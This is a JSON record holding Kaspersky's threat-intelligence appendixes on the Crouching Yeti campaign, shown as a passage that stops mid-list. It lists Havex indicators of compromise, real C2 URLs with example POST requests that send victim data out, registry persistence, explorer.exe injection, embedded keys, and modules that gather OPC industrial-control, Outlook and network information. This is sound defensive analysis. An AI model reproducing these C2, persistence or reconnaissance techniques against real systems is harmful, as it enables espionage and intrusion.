{
    "id": "46f70547-c876-47fb-ae63-ead8d0170a66",
    "created_at": "2022-10-25T16:48:15.159927Z",
    "updated_at": "2025-03-27T02:11:39.769522Z",
    "deleted_at": null,
    "sha1_hash": "a53ce340535461cc92e274f7c5bfb0d8653d5087",
    "title": "Crouching Yeti: Appendixes",
    "authors": "Kaspersky",
    "file_creation_date": "2014-07-31T13:14:09Z",
    "file_modification_date": "2014-07-31T13:14:13Z",
    "file_size": 3091589,
    "plain_text": "# Crouching Yeti — Appendixes\n\n## Kaspersky Lab Global Research and Analysis Team\n\nVersion 1.0\n\n\n-----\n\n# Contents\n\nI. Appendix 1: Indicators of compromise 3\nII. Appendix 2: Havex loader – detailed analysis 5\nIII. Appendix 3: The Sysmain backdoor – detailed analysis 47\nIV. Appendix 4: Ddex loader – detailed analysis 54\nV. Appendix 5: The ClientX backdoor – detailed analysis 57\nVI. Appendix 6: Karagany backdoor – detailed analysis 65\nVII. Appendix 7: C&C Analysis 71\nVIII. Appendix 8: Victim identification 73\nIX. Appendix 9: Hashes 81\nX. Appendix 10: Delivery methods – detailed analysis 86\n10.1. Hijacked installers of legitimate software 86\n10.2. Exploitation 90\n10.3. Obvious Metasploit Rips 102\n10.4. Changing Lights Out exploit sites’ download flow 104\n10.5. Related Targeted Software and CVE Entries 105\nXI. Appendix 11: Malicious Domains and Redirectors 108\nXII. Appendix 12: Previous and parallel research 115\n\n\n-----\n\n# I. Appendix 1: Indicators of compromise\n\nFiles:\n```\n%SYSTEM%\\TMPprovider0XX.dll\n%SYSTEM%\\svcprocess0XX.dll\n%SYSTEM%\\Phalanx-3d.Agent.dll\n%SYSTEM%\\Phalanx-3d.ServerAgent.dll\n%COMMON_APPDATA%\\TMPprovider0XX.dll\n%COMMON_APPDATA%\\Phalanx-3d.Agent.dll\n%COMMON_APPDATA%\\Phalanx-3d.ServerAgent.dll\n%APPDATA%\\TMPprovider0XX.dll\n%APPDATA%\\Phalanx-3d.Agent.dll\n%APPDATA%\\Phalanx-3d.ServerAgent.dll\n%APPDATA%\\sydmain.dll\n%TEMP%\\TMPprovider0XX.dll\n%TEMP%\\Phalanx-3d.Agent.dll\n%TEMP%\\Phalanx-3d.ServerAgent.dll\n%TEMP%\\srvsce32.dll\n%TEMP%\\~tmpnet.dll\n%TEMP%\\tmp687.dll\n%TEMP%\\*.xmd\n%TEMP%\\*.yls\n%TEMP%\\qln.dbx\n%TEMP%\\Low\\ddex.exe\n%TEMP%\\Low\\~tmppnet.dll\n%TEMP%\\Low\\~ntp.tmp\n%TEMP%\\Low\\~task.tmp\n%TEMP%\\Low\\~ldXXXX.TMP\n%TEMP%\\bp.exe\n%TEMP%\\~tmp1237.txt\nC:\\ProgramData\\\nC:\\ProgramData\\Cap\\\nC:\\ProgramData\\Mail\\\nC:\\ProgramData\\Mail\\MailAg\\\nC:\\ProgramData\\Cap\\Cap.exe\n\n```\n\n-----\n\n```\nC:\\ProgramData\\Mail\\MailAg\\scs.txt\n\n```\nRegistry values:\n```\nHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run@TMP provider\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run@TMP provider\nHKLM\\Software\\Microsoft\\Internet Explorer\\InternetRegistry@fertger\nHKCU\\\\Software\\Microsoft\\Internet Explorer\\InternetRegistry@fertger\nHKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows@\nLoad=”%TEMP%\\Low\\ddex.exe”\nHKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows@\nLoad=”%TEMP%\\Low\\ddex.exe”\nHKCU\\Software\\Microsoft\\Internet Explorer\\InternetRegistry\\SNLD@ID\nHKCU\\Software\\Microsoft\\Internet Explorer\\InternetRegistry\\SNLD@prv\nHKCU\\Software\\Microsoft\\Internet Explorer\\InternetRegistry\\SNLD@pubm\nHKCU\\Software\\Microsoft\\Internet Explorer\\InternetRegistry\\SNLD@pub\nHKCU\\Software\\Microsoft\\Internet Explorer\\InternetRegistry\\SNLD@nN (where N:=[0,x])\nHKCU\\Software\\Microsoft\\Internet Explorer\\InternetRegistry\\SNLD@pN (where N:=[0,x])\nHKCU\\Software\\Microsoft\\Internet Explorer\\InternetRegistry\\SNLD@sN (where N:=[0,x])\n\n```\nMutexes:\n```\n(6757)\n‘HKCU/Identities/Default User ID’+’-18890}’ example: {8B01CFB5-FF66-4404-89E227E06475EA38}-18890}\n{AD-18890}\n‘HKCU/Identities/Default User ID’+’-01890}’ example: {8B01CFB5-FF66-4404-89E227E06475EA38}-01890}\n{ED-01890}\n\n```\nNamed pipes:\n```\n\\\\.\\pipe\\mypype-f0XX\n\\\\.\\pipe\\mypype-g0XX\n\\\\.\\pipe\\mypipe-h0XX\n\n```\n\n-----\n\n# II. Appendix 2: Havex loader – detailed analysis\n\n## 2.1. Detailed analysis of the HAVEX loader sample (version 038)\n\n**File metadata and resources**\n\nSHA-256: 401215e6ae0b80cb845c7e2910dddf08af84c249034d76e0cf1aa31f0cf2ea67\nSize: 327168\nCompiled: Mon, 30 Dec 2013 12:53:48 UTC\nC2 urls: zhayvoronok.com/wp-includes/pomo/idx.php\ndreamsblock.com/witadmin/modules/source.php\nstalprof.com.ua/includes/domit/src.php\nResource: ICT 0x69, contains encrypted config:\n```\n        12.MTMxMjMxMg==.5.havex.10800000.12.Explorer.EXE.0.3.40.zhayvoronok.com/\n       wp-includes/pomo/idx.php.43.dreamsblock.com/witadmin/modules/source.php.38.\n       stalprof.com.ua/includes/domit/src.php.354.AATXn+MiwLu+xCoMG7SqY1uQxAk1qLdyo\n       ED9LxIVQr2Z/gsrHIsgTvK9AusdFo+9..fzAxf1zXj42880+kUmktmVb5HSYi8T27Q54eQ4ZLUFK\n       PKZstgHcwPVHGdwpmmRmk..09fL3KGd9SqR60Mv7QtJ4VwGDqrzOja+Ml4SI7e60C4qDQAAAAAAA\n       AAAAAAAAAAA..AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n       AA..AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA..AAAAAA\n       AAAAAAAAAAAAAAAQAB.2.25.26.5265882854508EFCF958F979E4.600000.2000.323000.\n\n```\nBase64 encrypted string MTMxMjMxMg== (“1312312” after decoding) is used as a\nXOR key.\n\n\n-----\n\n**Code flow**\n\nDLLMain\n\n- Decrypt and load resource, copy config data from resource to memory\n\n- Create main thread in suspended mode and thread that constantly checks some bool - if it’s set,\nmain thread is resumed\n\n- When the RunDllEntry export is called, the bool is set to 1 and the main thread is resumed\n\nRunDllEntry\n\n- Create a window and trigger resuming of the main thread\n\n- Create file and writes there the version number:\n```\n%TEMP%\\qln.dbx\n\n```\n- Create keys/values:\n```\n[HKLM|HKCU]\\Software\\Microsoft\\Internet Explorer\\InternetRegistry]\nfertger = (bot_id)\n\n```\nbot_id = random number based on CoCreateGuid(), some calculations and some\nmemory address; examples:\n```\n001:  4288595270379021982301EAFED001\n002:  1607204568126732018801F2FED002\n00F:  93249038331471783200C2FED00F\n012:  22561320586441617865023EFED0\n013:  2627437901628051734800C2FED0\n014:  1578266759509151668900DEFED0\n017:  251262960942470194870241FED0\n018:  1564893130116282046100B9FED0\n019:  1578266759509151668900DEFED0\n01A:  160720456812673201880242FE8C-1\n01B:  1607204568126732018800C2FE04-1\n01C:  24893503947647170630246FE04-3\n01D:  2627437901628051734800C2FE04-2\n01B:  1663328815238791903001EBFE04-1\n029:  1842673533224541887800BEFD88-3x1\n030 3787916004501911680200BEFD88 3 1\n\n```\n\n-----\n\n```\n030:  309276719429789193750028F978-3x1\n037:  24645644821769317791009AFD80-20\n037:  30816051733388016549009AFD80-1\n037:  6036449321755718127009AFD80-13\n038:  301542815316517628009AFD80-25\n038:  3126127065975717600009AFD80-25\n038:  28805135293025919409009AFDA8-25\n043:  18145851232284217441009AFD80-c8a7af419640516616c342b13efab\n044:  292219215960920240009AFD80-6d3aef9f2cf3ca9273631663f484a\n044:  2860397951987017001009AFD80-4b3c3453bdebb602642d18274c239\n\n```\n- Copy self to %SYSTEM%\\TMPprovider038.dll\nin case of failure, it tries to write to %APPDATA% or %TEMP%\n\n- Create run entry:\n```\n  [HKLM|HKCU]\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\n  TMP provider = “rundll32 <path>\\TMPprovider038.dll, RunDllEntry”\n\n```\n- Create named pipe:\n```\n  \\\\.\\pipe\\mypipe-h038\n\n```\n- In loop, create remote thread of explorer.exe which does:\n```\n  LoadLibrary(<path>\\TMPprovider038.dll)\n\n```\n- Look for all %TEMP%\\*.xmd files, read their paths and the contents\n\n- Get the base64 encrypted key from config and decode it\n\n- Get the content of *.xmd file and decode (base64), decrypt (using keys from config and binary)\nand decompress (bzip2), once decrypted and decompressed, the content of each *.xmd file is\nsaved as DLL and loaded to the memory\n\n- Check for some base64 encoded data string in:\n```\n  [HKCU\\Software\\Microsoft\\Internet Explorer\\InternetRegistry\\Options]\n  b = <data>\n\n```\n- Find *.yls file, read content and (optionally) add it to the POST request\n\n- Create POST request string:\n\nid=<victim_id>&v1=<bot_version>&v2=<os_ver>&q=<number_from_config>\n\nExample:\n```\n  id=28805135293025919409009AFDA8-25&v1=038&v2=170393861&q=5265882854508EFCF958F979E4\n\n```\n- Try to connect to compromised websites (C2 servers) and send POST request with the following\nparameters:\n\nid=<victim_id>&v1=<bot_version>&v2=<os_ver>&q=<sth_from_config>\n\nExample request:\n\n\n-----\n\n```\n  dreamsblock.com (ekiaiokqmo.c08.mtsvc.net, 205.186.179.176)\n  POST /witadmin/modules/source.php?id=28805135293025919409009AFDA8-25&v1=038&v2=17039\n  3861&q=5265882854508EFCF958F979E4\n\n```\n- Read the HTML file returned by the server, look for havex markers and copy data from between\nthem\n\n- Write the data to: %TEMP%\\<rand>.tmp.xmd\n\n- Decrypt/decompress content of xmd file to %TEMP%\\<rand>.dll\n\n- Load the DLL\n\nAt the moment of analysis, URLs from config were not returning any data:\n```\n stalprof.com.ua/includes/domit/src.php (server39.hosting.reg.ru, 37.140.193.27)\n 404\n zhayvoronok.com/wp-includes/pomo/idx.php (78.63.99.143)\n 404\n dreamsblock.com/witadmin/modules/source.php\n <html><head><mega http-equiv=’CACHE-CONTROL’ content=’NO-CACHE’>\n </head><body>No data!<!--havexhavex--></body></head>0.\n\n```\n**Encryption**\n\nThe 2nd stage modules are usually base64 encoded, bzip2 compressed and XORed using the\nrecurrent “1312312” key.\nIn some cases, the malware can also use one 1024 bit RSA key which is embedded in the config\nsection of the binary.\n\nKey from resource/config:\n\nBase64 encoded:\n```\nAATXn+MiwLu+xCoMG7SqY1uQxAk1qLdyoED9LxIVQr2Z/gsrHIsgTvK9AusdFo+9fzAxf1zXj42880+kUmktmVb\n5HSYi8T27Q54eQ4ZLUFKPKZstgHcwPVHGdwpmmRmk09fL3KGd9SqR60Mv7QtJ4VwGDqrzOja+Ml4SI7e60C4qDQ\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAB\n\n```\n\n-----\n\nDecoded RSA 1024 bit key:\n```\n0000000: 0004 d79f e322 c0bb bec4 2a0c 1bb4 aa63 .....”....*....c\n0000010: 5b90 c409 35a8 b772 a040 fd2f 1215 42bd [...5..r.@./..B.\n0000020: 99fe 0b2b 1c8b 204e f2bd 02eb 1d16 8fbd ...+.. N........\n0000030: 7f30 317f 5cd7 8f8d bcf3 4fa4 5269 2d99 .01.\\.....O.Ri-.\n0000040: 56f9 1d26 22f1 3dbb 439e 1e43 864b 5052 V..&”.=.C..C.KPR\n0000050: 8f29 9b2d 8077 303d 51c6 770a 6699 19a4 .).-.w0=Q.w.f...\n0000060: d3d7 cbdc a19d f52a 91eb 432f ed0b 49e1 .......*..C/..I.\n0000070: 5c06 0eaa f33a 36be 325e 1223 b7ba d02e \\....:6.2^.#....\n0000080: 2a0d\n\n```\nKey hardcoded in binary:\n\nBase64 encoded:\n```\nw1RWs6ejexm8wgqEpulkkESs9xmLQoiY8j/ldzNJ/fPj9t+taxYg6Vo0WgP0u0Me82TuCMxmU+Pcj44c8zP5xOe\nv4F097r5+saRutxj/Lmnr2AIgDqfM14GNHBQxmRQ3v0Swz6A+5zaMIqQX/13dWF1seQtKysvPQmIoPjvy648=\n\n```\nDecoded:\n```\n0000000: c354 56b3 a7a3 7b19 bcc2 0a84 a6e9 6490 .TV...{.......d.\n0000010: 44ac f719 8b42 8898 f23f e577 3349 fdf3 D....B...?.w3I..\n0000020: e3f6 dfad 6b16 20e9 5a34 5a03 f4bb 431e ....k. .Z4Z...C.\n0000030: f364 ee08 cc66 53e3 dc8f 8e1c f333 f9c4 .d...fS......3..\n0000040: e7af e05d 3dee be7e b1a4 6eb7 18ff 2e69 ...]=..~..n....i\n0000050: ebd8 0220 0ea7 ccd7 818d 1c14 3199 1437 ... ........1..7\n0000060: bf44 b0cf a03e e736 8c22 a417 ff5d dd58 .D...>.6.”...].X\n0000070: 5d6c 790b 4aca cbcf 4262 283e 3bf2 eb8f ]ly.J...Bb(>;...\n\n```\n\n-----\n\n**Analysis of other versions of the HAVEX loader**\n\nIMPORTANT: For versions 03-0E, 010, 011, 015, 016, 023, 026-028, 02A-02F,\nand 031-036 no samples are known at the moment.\n\n**Differences between versions**\n\nIt seems there are over 50 different versions of Havex malware, internally identified by hex numbers\nfrom 01 to 044 (the latest known at the time of writing).\n\n**Versions 01 – 019: Contain strings that may be related to password harvesting, even though the**\ncode that would actually search for the passwords was not identified inside this component. It’s\npossible that these strings are part of the configuration and are used by downloaded modules as\na list of names of processes that the malware wants to hijack in order to steal passwords from the\nmemory.\n\n**Versions 017 – 037: Instead of the GET request, send a POST request to the C2. The contents of the**\nPOST differ between versions.\n\n**Versions 01A – 038: Check proxy settings in the registry and use them if required.**\n\n**Versions 01B – 044: Use an asymmetric crypto algorithm (RSA) to decrypt the downloaded**\nbinaries. (Previous versions use simple XOR based encryption).\n\n**Versions 020 – 025: Check the Internet connection by trying to connect to google.com:**\n```\nCONNECT google.com:80 HTTP/1.0\n\n```\nCollect system information, write it to *.yls file. Later, append these contents to the POST request\nstring.\n\n- Collected information includes:\n\n- Unique system ID\n\n- OS\n\n- Username\n\n- Computer name\n\n- Country\n\n- Language\n\n- Current IP\n\n- List of drives\n\n- Default Browser\n\n\n-----\n\n- Running Processes\n\n- Proxy Setting\n\n- User Agent\n\n- Email Name\n\n- BIOS version and date\n\n- Lists of files and folders (non-recursive) from the following paths:\n```\n  C:\\Documents and Settings\\%User%\\Desktop\\*.*\n  C:\\Documents and Settings\\%User%\\My Documents\\*.*\n  C:\\Documents and Settings\\%User%\\My Documents\\Downloads\\*.*\n  C:\\Documents and Settings\\%User%\\My Documents\\My Music\\*.*\n  C:\\Documents and Settings\\%User%\\My Documents\\My Pictures\\*.*\n  C:\\Program Files\\*.*\n\n```\nRoot directory of all fixed and removable drives.\n\n**Version 025: Contains a debugging symbols path, which may suggest that the project was internally**\ncalled “PhalangX”:\n```\nd:\\Workspace\\PhalangX 3D\\Src\\Build\\Release\\Phalanx-3d.ServerAgent.pdb\n\n```\n**Version 038 – 040: Does not contain the routine that collects system info, yet the malware checks**\nfor potential previously created *.yls files, and appends the content of them to the POST request.\nInstead of values hardcoded in the binary, this is a first version to use a resource to store encrypted\nconfig. Detailed analysis of this version is included in this appendix.\n\n**Version 043 – 044: Size similar to 037 and earlier versions; dll name is now 0XX.dll (where XX is**\nversion number), the <unk> value in config is now 29 bytes long.\n\nFeatures common across multiple versions\n\nEXPORTS:\n```\nRunDllEntry, runDll (all versions)\n\n```\nINJECT TO:\n```\nExplorer.EXE (all versions)\n\n```\nREG VALUES CREATED:\n```\n[HKLM|HKCU]\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n“TMP provider” = “rundll32 %TEMP%\\TMPprovider0XX.dll, runDll”\n[HKLM|HKCU]\\Software\\Microsoft\\Internet Explorer\\InternetRegistry\n“fertger” = <id>(all versions)\n\n```\n\n-----\n\nFILES CREATED:\n```\n<path>\\TMPprovider0XX.dll (versions <= 040)\n%TEMP%\\*.xmd (all versions)\n%TEMP%\\*.yls (ver 01A - 044)\n%TEMP%\\qln.dbx (ver 038 - 044)\n\n```\nPIPES:\n```\n\\\\.\\pipe\\mypype-f0XX (ver 01 - 025)\n\\\\.\\pipe\\mypype-g0X (ver 01 & 02)\n\\\\.\\pipe\\mypipe-f0XX (ver 029 - 038)\n\\\\.\\pipe\\mypipe-h0XX (ver 029 - 038)\n\n```\nSTRINGS:\n```\n(all versions)\nq=\n“Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US)\nAppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.36\nSafari/525.19”\n(ver 01 - 030)\nhavex\n1312312\n(ver 0F, 012, 014, 018)\nPhalanx-3d.Agent.dll\n(ver 01A - 038)\nUser\nPassword\nBUTTON\n(ver 01B - 030)\nAATXn+MiwLu+xCoMG7SqY1uQxAk1qLdyoED9LxIVQr2Z/gsrHIsgTvK9AusdFo+9fzAxf1zXj42880+kUmktmVb\n5HSYi8T27Q54eQ4ZLUFKPKZstgHcwPVHGdwpmmRmk09fL3KGd9SqR60Mv7QtJ4VwGDqrzOja+Ml4SI7e60C4qDQ\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAB\n(ver 029 - 038)\nw1RWs6ejexm8wgqEpulkkESs9xmLQoiY8j/ldzNJ/fPj9t+taxYg6Vo0WgP0u0Me82TuCMxmU+Pcj44c8zP5xOe\nv4F097r5+saRutxj/Lmnr2AIgDqfM14GNHBQxmRQ3v0Swz6A+5zaMIqQX/13dWF1seQtKysvPQmIoPjvy648=\n(ver 020 - 025)\n2003\nVista\nUserName\nComp terName\n\n```\n\n-----\n\n```\nControl Panel\\International\\\nsCountry\nCountry\nsLanguage\nLanguage\nControl Panel\\International\\Geo\\\nNation\nNot connected\nDial-up\nLAN Connection\nInetInfo\nCurrentIP\n - Removable\n - Fixed\n - Remote\n - CDROM\n - Ramdisk\nDrive\nhttp\\shell\\open\\command\n.exe\nDefaultBrowser\nListProcess\ndata64\nHARDWARE\\DESCRIPTION\\System\nBiosReg\nDesktop\nMyDocs\nProgFiles\nCONNECT google.com:80 HTTP/1.0\nProxy-Authorization:Basic\ngoogle.com\nGET / HTTP/1.1\nHost: google.com\n(ver 025)\nPhalanx-3d.ServerAgent.dll\n“d:\\Workspace\\PhalangX 3D\\Src\\Build\\Release\\Phalanx-3d.ServerAgent.pdb”\n(ver 029 & 030)\n5265882854508EFCF958F979E4\n(ver 024, 029 - 038)\n&v1=\n\n```\n\n-----\n\n```\n&v2=\n(ver 037 & 038)\nMTMxMjMxMg==\n(ver 038 - 044)\n21f34\n(ver 043 - 044)\n04X.dll (instead of TmpPorvider0XX.dll)\n\n```\n**C2 communication**\n\n**Versions < 01B:**\n\nGET request format: `id=<victim_id><bot_version>-<os_ver>`\nExample `id=1812102418169072044901A0FED0014-170393861`\n\n**Versions 01B - 025:**\n\nGET request format: `id=<victim_id>-<unk>-<bot_version>-<os_ver>`\nExample: `id=228711719898841835201A0FDC0-3-021-170393861`\n\n**Versions 029 - 044:**\n\nPOST request format: `id=<victim_id>-<unk>&v1=<bot_version>&v2=<os_ver>&`\n\nq=<number_from_config><optional: content_of_yls_file>\nExamples: `id=28805135293025919409009AFDA8-25&v1=038&`\n```\n              v2=170393861&q=5265882854508EFCF958F979E4\n              id=21893020302943319666009AFD80-6d3aef9f2cf3ca9273631663f484a&v\n              1=044&v2=170393861&q=35a37eab60b51a9ce61411a760075\n\n```\nExamples of <unk>values: `version 01B` `1`\n```\n                  version 01C  2\n                  version 01D  1, 2\n                  version 01E  3\n                  version 01F  1, 2, 3, 0\n                  version 020  3, <null>, 0\n                  version 021  3, <null>\n                  version 022  3, <null>, 12\n                  version 024  13, 16, 1, 31, 61, 3, 3x1, 4, 12\n                  version 025 x1, <null>\n\n```\n\n-----\n\n```\n                  version 029  3x1\n                  version 030  3x1\n                  version 031  1, 3\n                  ver 031,035,036 1\n                  version 037  1, 6, 13, 33, 20, 25, 3x1\n                  version 038  25, 20, 1, 13,891062d5c51294011447f8168\n                             bc4437c\n                  version 040: eb383a9a8e7a4ef5283f2f48a5cd6\n                  version 043: e4d935d271cfb6927d29c74c39558\n                             c8a7af419640516616c342b13efab\n                  version 044: 6d3aef9f2cf3ca9273631663f484a\n\n```\n**Downloadable modules**\n\nMain characteristics:\n\n- DLL files that collect assorted information\n\n- Downloaded by the main Havex module\n\n- Stored in %TEMP%\\*xmd files in an encrypted form\n\n- Decrypted and executed by Havex loader\n\n- Each module contains config stored as a resource\n\n- Config data is compressed with bzip2 and xored with a constant value 1312312, which is\nhardcoded in the binary in base64 form\n\n- Config data includes 29-byte UID, 344-byte encryption key and sometimes some other info (like\nnk2 file path in case of outlook module)\n\n- Most of them write harvested data into the %TEMP%\\*.yls files, which are then sent to the C2\nby the main Havex DLL\n\n- Data written to *.yls files is compressed with bzip2 and encrypted with the key from the config\n\n- Encryption used for log encryption is 3DES. Each analyzed module contains the string:\n```\n  “Copyright (c) J.S.A.Kapp 1994 - 1996.”\n\n```\nwhich is related to R_STDLIB.C file (platform-specific C library routines for RSAEURO crypto\nlibrary)\n\n**OPC modules**\n\nSHA-256: 7933809aecb1a9d2110a6fd8a18009f2d9c58b3c7dbda770251096d4fcc18849\nSize: 251392\nCompiled: Fri, 11 Apr 2014 05:39:10 UTC\n\nSHA-256: 004c99be0c355e1265b783aae557c198bcc92ee84ed49df70db927a726c842f3\n\n\n-----\n\nSize: 251392\nCompiled: Fri, 16 May 2014 08:42:28 UTC\n\nSHA-256: 6aca45bb78452cd78386b8fa78dbdf2dda7fba6cc06482251e2a6820849c9e82\nSize: 251392\nCompiled: Fri, 16 May 2014 08:42:28 UTC\n\nDetailed analysis\n\nAll currently known samples are completely identical in terms of code and differ only in the content\nof the resource.\n\nCode flow:\n\n- Decrypt config\nConfig consists of RSA ID (29 bytes) and RSA key (1024 bit) and is stored inside resource TYU\n0215 (bzip compressed and xored with “1312312”)\n```\n  29\n  39ee448cf196304cfe9c6b1c2e436\n  344\n  AATFfxXmUZl/j8JBAwHkk8BcwTIKDcex+0GQp/V9EX4nt64NGsGsTXFhuorwjKCRt6Av3v+hB+gT9mAP9kqY\n  3TnN1x+MUHaoib1dw8SG9mW5YL+JNu3Kwud/bYGu916U/EGh8PFGruVE2PHXD8EII710gKm00lyi5+Ehjn5C\n  SLLPKwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n  AAAAAQAB\n\n```\n- Create lock file in %TEMP%\\{rand}.tmp (empty)\n\n- Create debug log in %TEMP%\\{rand}.tmp.dat\n```\n  Programm was started at %02i:%02i:%02i\n  %02i:%02i:%02i.%04i:\n  **************************************************************************\n\n```\nStart finging of LAN hosts...\n```\n  Finding was fault. Unexpective error\n  Was found %i hosts in LAN:\n  Hosts was’t found.\n\n```\nStart finging of OPC Servers...\n```\n  Was found %i OPC Servers.\n    %i) [<comp name>\\<ProgID>]\n\n```\n\n-----\n\n```\n        CLSID:       <server rclsid>\n        UserType:     <UserType>\n        VerIndProgID:   <VersionIndependentProgID>\n        OPC version support: <[+|-][+|-][+|-]>\n\n```\nOPC Servers not found. Programm finished\n```\n  Thread %02i return error code: <error_code>\n\n```\nStart finging of OPC Tags...\n```\n    %i)[%s\\%s]\n    Saved in ‘OPCServer%02i.txt’\n    %i)[%s] (not aviable)\n  Thread %02i was terminated by ThreadManager(2)\n  Thread %02i running...\n\n```\nThread %02i finished.\n\n- Look for LAN resources using Windows Networking COM objects:\n```\n  WNetOpenEnumW\n  WNetEnumResource\n\n```\n- For each resource found, create a thread which checks if it’s an OPC server & gets detailed OPC\ninformation using the following interfaces:\n```\n  IID_IOPCEnumGUID {55C382C8-21C7-4E88-96C1-BECFB1E3F483}\n  IID_IOPCServerList   {13486D51-4821-11D2-A494-3CB306C10000}\n  IID_IOPCServerList2  {9DD0B56C-AD9E-43ee-8305-487F3188BF7A}\n  IID_IOPCServer  {39C13A4D-011E-11D0-9675-0020AFD8ADB3}\n  IID_IOPCBrowse  {39227004-A18F-4B57-8B0A-5235670F4468}\n  IID_IOPCBrowseServerAddressSpace  {39C13A4F-011E-11D0-9675-0020AFD8ADB3}\n  IID_IOPCItemProperties {39C13A72-011E-11D0-9675-0020AFD8ADB3}\n  CATID_OPCDAServer10  {63D5F430-CFE4-11D1-B2C8-0060083BA1FB}\n  CATID_OPCDAServer20  {63D5F432-CFE4-11D1-B2C8-0060083BA1FB}\n  CATID_OPCDAServer30  {CC603642-66D7-48F1-B69A-B625E73652D7}\n\n```\nand writes collected info to the OPCServer<nr>.txt file:\n```\n  %s <%s> (Type=%i, Access=%i, ID=’%s’)\n  OPC Server[%s\\%s] v%i.%i(b%i)\n  Server state: %i\n  Group count value: %i\n  Server band width: %08x\n\n```\n\n-----\n\n- Compress all info with bzip2 and encrypt using a random 192 bit (168 effective) 3DES key\n\n- Save encrypted data to %TEMP%\\{rand}.yls file\n\n- `*.yls files are then collected by the main Havex module and sent to C2.`\n\n**Outlook module**\n\nSHA-256: 0859cb511a12f285063ffa8cb2a5f9b0b3c6364f8192589a7247533fda7a878e\nSize: 261120\nCompiled: Wed, 07 May 2014 13:22:21 UTC\n\nThis module looks for outlook.nk2 files, gets the contact data from inside them and writes it to the\n```\n*.yls file. Data is as always bzip2 compressed and 3DES encrypted. Config is stored in the resource\nHYT 017D (bzip2 compressed and encrypted with same xor key as always). Config consists of an RSA\n\n```\nkey ID (29 bytes), base 64 bit encodedRSA key (1024 bit) and nk2 file path (39 bytes).\n```\noutlook.nk2 is the file where Outlook <= 2007 stores contacts details in order to use them in its\n\n```\nAutoComplete feature.\n\nConfig from resource HYT 017D:\n```\n29\n3e5bad153e3c3ee1b735f1926ba57\n344\nAATiBnMKBUxUwXUCXp4+ztY4nCTylL6KRsk6x44SgKDDNdQ9VB7UC86fQVLZOjpc2bdgFxi5tegJEE3SfZvQYJ1\nPQ0s1zXh4xdXQxyEqllgGdaAcEOoM3dXCkQatFFYQ8pscbFkdLDrt/sWnbUTq2/KY8eCfW2QPhWgj7p8v6Cov1Q\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAB\n39\n%APPDATA%\\microsoft\\outlook\\outlook.nk2\n\n```\n**Sysinfo module**\n\nSHA-256: f4bfca326d32ce9be509325947c7eaa4fb90a5f81b5abd7c1c76aabb1b48be22\nSize: 400896\nCompiled: Wed, 07 May 2014 13:19:41 UTC\n\nThis module collects the same type of information about the system as Havex versions 020 - 025.\nThis functionality is not present in versions >=026 - it was probably moved into this separate\nmodule around that time\n\n\n-----\n\nConfig in stored in resource WRT 2AF (xored with “1312312” and bzip2 compressed)\n```\n29\n8900adffc5180c10d463530e3753a\n344\nAASjl8ZrgVvtb1XSXJgu6x1ZPjY32KQ9iyj+cQZpJgp/H+GhPdItvu10pBcgwIkc2uO2iYSJzXqfZAlS2fS9+W9\ny1Xq/7lKuVJEeQC4vgn8EsTmzj4vLWV+oZOOJHrrv37YkXO6QGnFgREyLTLjnfnrTaoWg9pd6dkeC4yHEC7K8HQ\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAB\n\n```\n**Network scanner module**\n\nSHA-256: 2120c3a30870921ab5e03146a1a1a865dd24a2b5e6f0138bf9f2ebf02d490850\nSize: 223232\nCompiled: Tue, 29 Oct 2013 06:09:14 UTC\n\nThis module is used to decrypt and execute the binary that comes in the resource. The EXE file is\nsaved in %TEMP%\\<rand>.exe and run using ShellExecuteExW.\n\nBesides the binary, resource HAJ 3A0 contains hex string: 30 0A 30 0A 34 38 36 34 30 0A\n\n3rd stage tool: network scanner\n\nSHA-256: 9a2a8cb8a0f4c29a7c2c63ee58e55aada0a3895382abe7470de4822a4d868ee6\nSize: 48640\nCompiled: Wed, 06 Nov 2013 11:27:38 UTC\n\nThis PE EXE file was dropped and run by EXE dropper module (2120c3a30870921ab5e0314\n6a1a1a865dd24a2b5e6f0138bf9f2ebf02d490850). Its main functionality is to scan the local\nnetwork looking for machines listening on specified ports. All information is logged into a\n```\n%TEMP%\\~tracedscn.yls file in plain text.\n\n```\n- List of port numbers hardcoded in the binary:\n```\n   .data:0040CDB0 port_list  \n   dd 0AF12h ; port 44818, used by Rslinx\n   dd 1F6h  